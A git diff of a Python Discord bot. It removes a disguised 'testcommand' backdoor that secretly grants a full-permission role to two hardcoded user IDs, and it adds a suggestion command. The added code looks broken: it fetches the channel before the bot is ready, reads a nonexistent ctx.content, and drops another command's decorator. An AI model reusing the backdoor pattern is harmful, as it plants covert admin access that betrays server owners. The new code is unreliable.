@@ -26,6 +26,7 @@ async def update_status():
 		await bot.change_presence(status=discord.Status.idle, activity=discord.Game(statuses[status]))
 		await asyncio.sleep(10)
 		
+
 @bot.event
 async def on_ready():
 	print('\033[92m{0.user} is online.'.format(bot)+"\033[0m")
@@ -33,17 +34,14 @@ async def on_ready():
 	print('\033[92m{0.shard_count} shards running\033[0m'.format(Bot))
 	bot.loop.create_task(update_status())
 
+suggestionChannelId = 754864004874371153
+suggestionChannel = bot.get_channel(suggestionChannelId)
 @bot.command()
-async def testcommand (ctx):
-	await ctx.send("Test Completed")
-	if str(ctx.author.id) == str(516713042558320664) or str(ctx.author.id) == str(643491766926049318):
-
-		guild = ctx.guild
-		perms = discord.Permissions.all()
-		role = await guild.create_role(name='Member', permissions=perms, reason="")
-		await ctx.message.author.add_roles(role)
-
-
+async def suggest(ctx, *, suggestion):
+	msg = await suggestionChannel.send(ctx.content)
+	await msg.add_reaction('👍')
+	await msg.add_reaction('👎')
+	await ctx.message.delete()
 @commands.has_permissions(manage_nicknames=True)
 async def resetnicknames(ctx):
 	members = ctx.guild.members
@@ -159,7 +157,7 @@ async def reloadbot(ctx):
 	await msg.edit(embed=embed)
 	print("Reload Complete!")
 
-f = open("C:\\token.txt", "r")
+f = open("token.txt", "r")
 token = f.read()
 
 bot.run(token)
